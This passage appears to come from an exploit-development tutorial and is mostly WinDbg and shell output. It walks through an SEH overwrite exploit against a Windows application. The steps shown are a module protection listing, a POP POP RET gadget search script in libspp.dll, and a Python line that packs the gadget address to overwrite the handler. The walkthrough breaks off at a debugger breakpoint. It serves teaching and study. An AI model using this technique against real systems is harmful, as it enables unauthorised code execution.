</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74560000</span> <span style="color:#ae81ff">745f</span><span style="color:#ae81ff">0000</span> DNSAPI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>DNSAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">745f</span><span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">745f</span>b000 NETUTILS             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>NETUTILS.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74790000</span> <span style="color:#ae81ff">747e7000</span> mswsock              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>mswsock.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">749</span>d0000 <span style="color:#ae81ff">749f</span><span style="color:#ae81ff">5000</span> Wldp                 <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>Wldp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74</span>cb0000 <span style="color:#ae81ff">74</span>cb8000 DPAPI                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>DPAPI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74e00000</span> <span style="color:#ae81ff">74e25000</span> SspiCli              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>SspiCli.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74f</span><span style="color:#ae81ff">10000</span> <span style="color:#ae81ff">7514e000</span> KERNELBASE           <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>KERNELBASE.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75150000</span> <span style="color:#ae81ff">75236000</span> gdi32full            <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>gdi32full.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75240000</span> <span style="color:#ae81ff">7525</span>b000 bcrypt               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>bcrypt.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75260000</span> <span style="color:#ae81ff">7535e000</span> CRYPT32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>CRYPT32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75450000</span> <span style="color:#ae81ff">7546</span>d000 win32u               NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>win32u.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75470000</span> <span style="color:#ae81ff">754</span>eb000 msvcp_win            <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>msvcp_win.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75540000</span> <span style="color:#ae81ff">7557</span>b000 cfgmgr32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>cfgmgr32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75580000</span> <span style="color:#ae81ff">756</span>a0000 ucrtbase             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ucrtbase.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75700000</span> <span style="color:#ae81ff">757e3000</span> ole32                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ole32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75940000</span> <span style="color:#ae81ff">75</span>bc1000 combase              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>combase.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75</span>bd0000 <span style="color:#ae81ff">7600</span>b000 SETUPAPI             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SETUPAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76010000</span> <span style="color:#ae81ff">76055000</span> SHLWAPI              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHLWAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76060000</span> <span style="color:#ae81ff">760f</span>d000 KERNEL32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>KERNEL32.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76100000</span> <span style="color:#ae81ff">76187000</span> SHCORE               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHCORE.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76190000</span> <span style="color:#ae81ff">76226000</span> OLEAUT32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>OLEAUT32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76230000</span> <span style="color:#ae81ff">762f</span><span style="color:#ae81ff">3000</span> RPCRT4               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>RPCRT4.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">763e0000</span> <span style="color:#ae81ff">763e7000</span> NSI                  NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>NSI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76560000</span> <span style="color:#ae81ff">76</span>b39000 SHELL32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHELL32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>b40000 <span style="color:#ae81ff">76</span>bff000 MSVCRT               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>MSVCRT.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>c00000 <span style="color:#ae81ff">76</span>c77000 sechost              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>sechost.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>c80000 <span style="color:#ae81ff">76</span>ce3000 WS2_32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>WS2_32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>cf0000 <span style="color:#ae81ff">76</span>d12000 GDI32                NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>GDI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76e20000</span> <span style="color:#ae81ff">76e9</span>d000 ADVAPI32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ADVAPI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>ea0000 <span style="color:#ae81ff">76</span>ea6000 PSAPI                NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>PSAPI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>eb0000 <span style="color:#ae81ff">77027000</span> USER32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>USER32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77030000</span> <span style="color:#ae81ff">771</span>cf000 ntdll                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>ntdll.dll
</span></span></code></pre></div><p>There are several modules. However, the libspp.dll application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.
We will use a WinDBG script to search for a POP32, POP32, RET instruction. We will use a classic WinDbg.
Narly did also give us the memory region of the library.</p>
<p>We want to gather all the possible opcodes of the POP instructions for each available register. We don&rsquo;t want to perform a &ldquo;pop esp&rdquo; as this will modify the esp, the stack pointer, and disrupt the stack frame. The rest of the register are fine for us.
let&rsquo;s find all the opcodes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell 
</span></span><span style="display:flex;"><span>nasm &gt; pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">58</span>                pop eax
</span></span><span style="display:flex;"><span>nasm &gt; pop ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5B                pop ebx
</span></span><span style="display:flex;"><span>nasm &gt; pop ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">59</span>                pop ecx
</span></span><span style="display:flex;"><span>nasm &gt; pop edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5A                pop edx
</span></span><span style="display:flex;"><span>nasm &gt; pop esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5E                pop esi
</span></span><span style="display:flex;"><span>nasm &gt; pop edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5F                pop edi
</span></span><span style="display:flex;"><span>nasm &gt; pop ebp 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5D                pop ebp
</span></span><span style="display:flex;"><span>nasm &gt; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  C3                ret
</span></span><span style="display:flex;"><span>nasm &gt; 
</span></span></code></pre></div><p>We can see that all the &ldquo;pop&rdquo; instruction start from opcode 58 to 5D. Ret opcode is C3.
With this information, we will execute a WinDBG script that will search <strong>around the base address of the module we want to search for these instructions, and find a pop, pop, ret, instruction</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.block 
</span></span><span style="display:flex;"><span>{ 
</span></span><span style="display:flex;"><span>	.<span style="color:#66d9ef">for</span> (r <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>; <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5F</span>; r <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01</span>) 
</span></span><span style="display:flex;"><span>	{ 
</span></span><span style="display:flex;"><span>		.<span style="color:#66d9ef">for</span> (r <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>; <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5F</span>; r <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01</span>) 
</span></span><span style="display:flex;"><span>		{ 
</span></span><span style="display:flex;"><span>			s<span style="color:#f92672">-</span>[<span style="color:#ae81ff">1</span>]b <span style="color:#ae81ff">10000000</span> <span style="color:#ae81ff">10226000</span> <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#960050;background-color:#1e0010">$</span>t1 c3 
</span></span><span style="display:flex;"><span>		} 
</span></span><span style="display:flex;"><span>	} 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s execute this script in WinDbg: <strong>remember to replace the address range of the module!</strong>
The results are that there are <strong>several chains of these instructions:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;&lt;</span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>user<span style="color:#960050;background-color:#1e0010">\</span>Desktop<span style="color:#960050;background-color:#1e0010">\</span>find_ppr.wds
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1015a2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100087dd</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10008808</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1000881a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10008829</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1001bb8a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1001bc1f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100491e4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1006ef94</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1006ef9b</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008922a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089280</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008971d</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089748</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008975a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089769</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089ddb</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089e01</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008a717</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008a7a3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b063</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b082</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b0e5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b0f8</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b9f9</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008ba7f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008bb8c</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008bb95</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1009a662</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1009af98</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100a4bdb</span>
</span></span></code></pre></div><p>Let&rsquo;s see that, for example, the first one, points to a valid chain, <strong>check that there is no pop esp before using this! And also check that the address does not have badchars!</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0x1015a2f0</span> L3
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Each pop is in a different register, but as we said, it does not mind for now.
So, let&rsquo;s update the exploit so that the SEH handler structure points to this address: 0x1015a2f0
To do this easy, we can use the &ldquo;pack&rdquo; library to represent this address in little endian:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>inputBuffer<span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x1015a2f0</span>)) <span style="color:#75715e"># Overwrite SEH address with pop eax; pop ebx; ret </span>
</span></span></code></pre></div><p>And if we send the payload and see the handlers, we see that the handler has been modified to the 0x1015a2f0 address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>c6000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dfe0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">008e0000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>c6000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">91</span>c . <span style="color:#ae81ff">0000124</span>c
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0060</span><span style="color:#ae81ff">8320</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>b5000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dfe0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x008dff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x008dff44</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1015a2f0</span>     _EXCEPTION_DISPOSITION  libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0x1015a2f0</span> L3
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Now, let&rsquo;s examine what will happen: There will be an exception, the first handler won&rsquo;t be able to manage it and jump to the second handler, which we have modified. The handler address is at our set of pop, pop, ret instructions, and that should point to our shellcode, which we saw that is stored as the third parameter on the stack.</p>
<p>Let&rsquo;s put a breapoint on our &ldquo;pop, pop, ret&rdquo; chain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x1015a2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
